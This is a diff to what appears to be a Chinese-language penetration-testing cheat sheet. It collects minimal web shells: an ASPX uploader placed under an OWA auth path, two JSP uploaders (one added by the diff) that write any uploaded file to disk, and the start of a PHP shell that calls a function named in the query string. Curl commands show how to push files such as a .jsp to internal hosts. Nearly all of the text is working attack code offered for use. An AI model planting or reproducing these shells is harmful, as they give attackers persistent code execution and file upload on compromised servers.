@@ -332,11 +332,26 @@ curl -k  -F "myfile=@t.txt" "http://127.0.0.1/owa/auth/3.aspx"   //-K 忽略证�
 <%@ Page Language="C#" %><% if (Request.Files.Count > 0) Request.Files[0].SaveAs(Server.MapPath("./" + Request.Files[0].FileName)); %>
 curl -X POST -F "file=@c:/windows/temp/vm.log" http://192.168.1.3/up.aspx
 
+jsp 版本1
 <%@ page import="java.io.*"%><% request.getPart("file").write(getServletContext().getRealPath("/") + "uploadDemo.jsp"); %>
 curl -X POST -F "file=@/path/to/your/file" http://your_server_address/your_upload_page.jsp
 
-
-
+jsp版本2
+<%@ page import="org.apache.commons.fileupload.*, org.apache.commons.fileupload.disk.*, org.apache.commons.fileupload.servlet.*, java.util.*, java.io.*" %>
+<%
+if (ServletFileUpload.isMultipartContent(request)) {
+    DiskFileItemFactory factory = new DiskFileItemFactory();
+    ServletFileUpload upload = new ServletFileUpload(factory);
+    List<FileItem> items = upload.parseRequest(request);
+    for (FileItem item : items) {
+        if (!item.isFormField()) {
+            item.write(new File(item.getName()));
+            break;
+        }
+    }
+}
+%>
+curl -F "f=@/tmp/a.jsp" http://192.168.1.2/upload.jsp
 
 <?php
 $func = new ReflectionFunction($_GET[m]);
